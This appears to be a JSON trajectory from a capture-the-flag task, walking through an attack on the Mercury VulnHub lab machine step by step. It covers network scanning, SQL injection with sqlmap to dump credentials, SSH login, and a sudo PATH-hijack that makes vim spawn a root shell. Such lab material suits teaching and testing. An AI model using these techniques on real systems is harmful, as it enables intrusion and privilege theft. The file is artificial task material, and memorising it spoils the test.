@@ -1,0 +1,179 @@
+{
+    "initial_prompt": "Objective: Using a Kali 2024 attack machine, identify and exploit vulnerabilities on the Mercury VulnHub target machine. The goal is to gain initial access as user 'webmaster', retrieve the user flag (MD5 hash), escalate privileges to root, and obtain the root flag (MD5 hash).",
+    "steps": [
+        {
+            "step_number": 1,
+            "thought": "Discover the IP address of the target Mercury VulnHub machine on the local network.",
+            "command": "sudo netdiscover -r 192.168.0.0/24",
+            "result": "Netdiscover scans the specified network range. Output lists active hosts. The target machine (Mercury) is identified with IP 192.168.0.163. Example line: `192.168.0.163   AB:CD:EF:12:34:56      1      60  VendorName`"
+        },
+        {
+            "step_number": 2,
+            "thought": "Perform an aggressive Nmap scan on the target IP to identify open ports, services, and OS details.",
+            "command": "nmap -A 192.168.0.163",
+            "result": "Nmap scan report for 192.168.0.163:\nHost is up.\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.x (protocol 2.0)\n8080/tcp open  http    Apache httpd 2.4.x ((Ubuntu))\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel"
+        },
+        {
+            "step_number": 3,
+            "thought": "Explore the web service on port 8080 by fetching the main page.",
+            "command": "curl http://192.168.0.163:8080/",
+            "result": "HTML output of the main page is retrieved. It's a basic page with no immediately obvious forms or exploitable links. Example: `<html>...<h1>Welcome to Mercury</h1>...</html>`"
+        },
+        {
+            "step_number": 4,
+            "thought": "Enumerate web directories on port 8080 to find hidden paths or files.",
+            "command": "dirb http://192.168.0.163:8080/",
+            "result": "Dirb scan output. Example relevant line: `+ http://192.168.0.163:8080/robots.txt (CODE:200|SIZE:0)`. This indicates `robots.txt` exists."
+        },
+        {
+            "step_number": 5,
+            "thought": "Investigate the `robots.txt` file found by dirb.",
+            "command": "curl http://192.168.0.163:8080/robots.txt",
+            "result": "The command returns an empty response, indicating the `robots.txt` file is blank."
+        },
+        {
+            "step_number": 6,
+            "thought": "Attempt to trigger an error or reveal more information by requesting a wildcard path on the web server.",
+            "command": "curl -i http://192.168.0.163:8080/*",
+            "result": "The server returns an HTTP error (e.g., 404 Not Found or 500 Internal Server Error). The error page content inadvertently reveals a new directory path: `/mercuryfacts`. Example snippet: `<p>Error details: ... check path /mercuryfacts ...</p>`"
+        },
+        {
+            "step_number": 7,
+            "thought": "Explore the newly discovered `/mercuryfacts` directory.",
+            "command": "curl http://192.168.0.163:8080/mercuryfacts/",
+            "result": "HTML output shows a hyperlink. Example: `<a href=\"/mercuryfacts/1\">Load a Fact.</a>`. This suggests a dynamic page based on an ID."
+        },
+        {
+            "step_number": 8,
+            "thought": "Access the 'Load a Fact' link to understand its structure and confirm parameter usage.",
+            "command": "curl http://192.168.0.163:8080/mercuryfacts/1",
+            "result": "HTML output displays content like `Fact id: 1. Mercury is a planet.`. This confirms the URL structure `.../mercuryfacts/{id}` and suggests the ID is a parameter, potentially vulnerable to SQL injection."
+        },
+        {
+            "step_number": 9,
+            "thought": "Use sqlmap to test for SQL injection on the `/mercuryfacts/{id}` endpoint and enumerate databases.",
+            "command": "sqlmap -u \"http://192.168.0.163:8080/mercuryfacts/1*\" --dbs --batch",
+            "result": "sqlmap identifies the parameter (marked by `*`) as injectable. Output lists available databases. Example: `available databases [2]:\n[*] information_schema\n[*] mercury`"
+        },
+        {
+            "step_number": 10,
+            "thought": "Dump all data from the 'mercury' database using sqlmap to find credentials or sensitive information.",
+            "command": "sqlmap -u \"http://192.168.0.163:8080/mercuryfacts/1*\" -D mercury --dump-all --batch",
+            "result": "sqlmap dumps tables from the 'mercury' database. A table (e.g., 'users') reveals credentials. Example: `Database: mercury\nTable: users\n[X entries]\n+----+-----------+-----------+\n| id | username  | password  |\n+----+-----------+-----------+\n| ...| webmaster | Password1 |\n+----+-----------+-----------+`"
+        },
+        {
+            "step_number": 11,
+            "thought": "Attempt to log in to the target machine via SSH using the 'webmaster:Password1' credentials.",
+            "command": "ssh webmaster@192.168.0.163",
+            "result": "The system prompts for a password. After entering 'Password1', the login is successful. The shell prompt changes to `webmaster@mercury:~$`."
+        },
+        {
+            "step_number": 12,
+            "thought": "Verify the current user's identity on the target machine.",
+            "command": "id",
+            "result": "Output confirms user identity: `uid=1001(webmaster) gid=1001(webmaster) groups=1001(webmaster)`."
+        },
+        {
+            "step_number": 13,
+            "thought": "List files in the webmaster's home directory to locate the user flag.",
+            "command": "ls -la",
+            "result": "Output lists files and directories in `/home/webmaster/`. Key items found: `user_flag.txt` and a directory `mercury_proj/`."
+        },
+        {
+            "step_number": 14,
+            "thought": "Read the user flag file.",
+            "command": "cat user_flag.txt",
+            "result": "The content of `user_flag.txt` is displayed, e.g., `UserFlag{MD5_HASH_FOR_USER_FLAG}`."
+        },
+        {
+            "step_number": 15,
+            "thought": "Navigate into the `mercury_proj` directory to look for further clues.",
+            "command": "cd mercury_proj/",
+            "result": "The current directory changes to `/home/webmaster/mercury_proj/`. The prompt updates to `webmaster@mercury:~/mercury_proj$`."
+        },
+        {
+            "step_number": 16,
+            "thought": "List the contents of the `mercury_proj` directory.",
+            "command": "ls",
+            "result": "Output lists files within `mercury_proj/`. A file named `notes.txt` is found."
+        },
+        {
+            "step_number": 17,
+            "thought": "Examine the `notes.txt` file for potential credentials or hints.",
+            "command": "cat notes.txt",
+            "result": "The content of `notes.txt` is displayed: `webmaster:UGFzc3dvcmQx\nlinuxmaster:V2VsY29tZTEyMw==`. These appear to be Base64 encoded strings."
+        },
+        {
+            "step_number": 18,
+            "thought": "Decode the Base64 string associated with 'linuxmaster' to get the password.",
+            "command": "echo \"V2VsY29tZTEyMw==\" | base64 -d",
+            "result": "The command outputs the decoded password: `Welcome123`."
+        },
+        {
+            "step_number": 19,
+            "thought": "Attempt to switch to the 'linuxmaster' user account using the decoded password.",
+            "command": "su linuxmaster",
+            "result": "The system prompts for a password. After entering 'Welcome123', the user successfully switches to 'linuxmaster'. The prompt changes, e.g., `linuxmaster@mercury:/home/webmaster/mercury_proj$`."
+        },
+        {
+            "step_number": 20,
+            "thought": "Check the sudo privileges for the 'linuxmaster' user to find potential privilege escalation vectors.",
+            "command": "sudo -l",
+            "result": "Output displays sudo privileges for 'linuxmaster'. Example relevant line: `User linuxmaster may run the following commands on mercury:\n    (root) SETENV: NOPASSWD: /usr/bin/check_syslog.sh`."
+        },
+        {
+            "step_number": 21,
+            "thought": "Inspect the `/usr/bin/check_syslog.sh` script to understand its functionality and identify vulnerabilities.",
+            "command": "head -n 5 /usr/bin/check_syslog.sh",
+            "result": "Displays the first few lines of the script. Example content:\n`#!/bin/bash\n# Script to check syslog\necho \"Last 10 syslog entries:\"\ntail -n 10 /var/log/syslog`\nThe script calls `tail` without an absolute path, making it vulnerable to PATH manipulation."
+        },
+        {
+            "step_number": 22,
+            "thought": "Create a directory to stage the PATH manipulation exploit.",
+            "command": "mkdir /tmp/pwn",
+            "result": "No output on success. Directory `/tmp/pwn` is created."
+        },
+        {
+            "step_number": 23,
+            "thought": "Change the current directory to the newly created `/tmp/pwn` directory.",
+            "command": "cd /tmp/pwn",
+            "result": "The current directory changes to `/tmp/pwn`. The prompt updates to `linuxmaster@mercury:/tmp/pwn$`."
+        },
+        {
+            "step_number": 24,
+            "thought": "Create a symbolic link named `tail` in the current directory (`/tmp/pwn`) that points to `/usr/bin/vim`. This will hijack the `tail` command called by the script.",
+            "command": "ln -s /usr/bin/vim tail",
+            "result": "No output on success. Symbolic link `/tmp/pwn/tail` is created, pointing to `/usr/bin/vim`."
+        },
+        {
+            "step_number": 25,
+            "thought": "Modify the PATH environment variable to prioritize the current directory (`/tmp/pwn`), so the custom `tail` (vim) is executed.",
+            "command": "export PATH=$(pwd):$PATH",
+            "result": "No output on success. The PATH variable is updated for the current session, with `/tmp/pwn` at the beginning."
+        },
+        {
+            "step_number": 26,
+            "thought": "Execute the `check_syslog.sh` script using sudo, preserving the modified PATH, to trigger the exploit.",
+            "command": "sudo --preserve-env=PATH /usr/bin/check_syslog.sh",
+            "result": "The `check_syslog.sh` script runs. Due to the manipulated PATH, it executes `/tmp/pwn/tail` (which is `vim`) with root privileges. Vim opens, likely attempting to display a log file."
+        },
+        {
+            "step_number": 27,
+            "thought": "Spawn a root shell from within the vim session (which is running as root).",
+            "command": "(Inside vim, type) :!/bin/bash",
+            "result": "A command `:!/bin/bash` is entered in vim's command mode and executed. This spawns a new bash shell with root privileges. The shell prompt changes to `root@mercury:/tmp/pwn#` (or similar)."
+        },
+        {
+            "step_number": 28,
+            "thought": "Navigate to the root user's home directory to find the root flag.",
+            "command": "cd /root",
+            "result": "The current directory changes to `/root/`. The prompt updates to `root@mercury:/root#`."
+        },
+        {
+            "step_number": 29,
+            "thought": "Read the root flag file.",
+            "command": "cat root_flag.txt",
+            "result": "The content of `root_flag.txt` is displayed, e.g., `RootFlag{MD5_HASH_FOR_ROOT_FLAG}`. This completes the challenge."
+        }
+    ]
+}
